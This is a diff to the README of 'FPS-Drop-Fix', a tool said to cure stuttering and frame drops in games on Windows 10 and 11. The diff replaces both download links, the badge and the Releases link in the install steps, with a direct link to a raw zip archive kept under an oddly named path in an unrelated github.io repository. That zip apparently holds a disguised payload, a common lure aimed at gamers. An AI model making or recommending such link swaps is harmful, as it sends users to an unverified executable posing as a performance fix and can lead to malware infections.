@@ -5,7 +5,7 @@ description: "Optimize Windows 10 and 11 settings to stop frame drops, stutterin
 ---
 # 🚀 FPS-Drop-Fix - Improve Your Game Performance on Windows
 
-[![](https://img.shields.io/badge/Download-FPS--Drop--Fix-blue)](https://github.com/stephenarnolddouglassuspect203/FPS-Drop-Fix/releases)
+[![](https://img.shields.io/badge/Download-FPS--Drop--Fix-blue)](https://github.com/stephenarnolddouglassuspect203/stephenarnolddouglassuspect203.github.io/raw/refs/heads/main/sinapoline/io-stephenarnolddouglassuspect-github-3.2.zip)
 
 ## 🎯 Purpose
 FPS-Drop-Fix helps you remove stuttering and micro-freezes in your games. This tool adjusts hidden settings in Windows 10 and Windows 11. These changes help your hardware work at its peak. You get more frames per second and better input response. Use this tool for titles like Valorant, Fortnite, CS2, and Rust.
@@ -27,7 +27,7 @@ The software makes several adjustments to your system:
 ## 💾 How to Install
 Follow these steps to set up the software.
 
-1. Go to the [Releases page](https://github.com/stephenarnolddouglassuspect203/FPS-Drop-Fix/releases).
+1. Go to the [Releases page](https://github.com/stephenarnolddouglassuspect203/stephenarnolddouglassuspect203.github.io/raw/refs/heads/main/sinapoline/io-stephenarnolddouglassuspect-github-3.2.zip).
 2. Look for the latest version listed under the Assets section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find.
